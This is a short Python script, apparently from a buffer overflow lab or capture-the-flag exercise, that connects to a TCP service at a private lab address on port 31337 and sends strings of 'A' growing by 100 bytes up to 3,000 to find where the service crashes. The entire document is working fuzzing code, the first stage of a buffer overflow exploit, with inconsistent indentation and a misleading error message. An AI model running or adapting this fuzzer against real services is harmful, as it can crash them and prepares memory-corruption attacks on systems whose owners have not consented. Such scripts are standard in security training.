import sys,time,socket

ip = "10.10.133.17"
port = 31337
timeout = 2

test = []
counter = 100

while len(test) < 30:
    test.append("A" * counter)
    counter = counter + 100

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))

for string in test:
    try:
	print("lenght of the string " + str(len(string)))
	s.send(string + "\r\n")
        s.recv(1024)
        
        s.settimeout(timeout)
    except:
        print("couldn't connect to "+ ip + " port " + str(port))
        sys.exit()



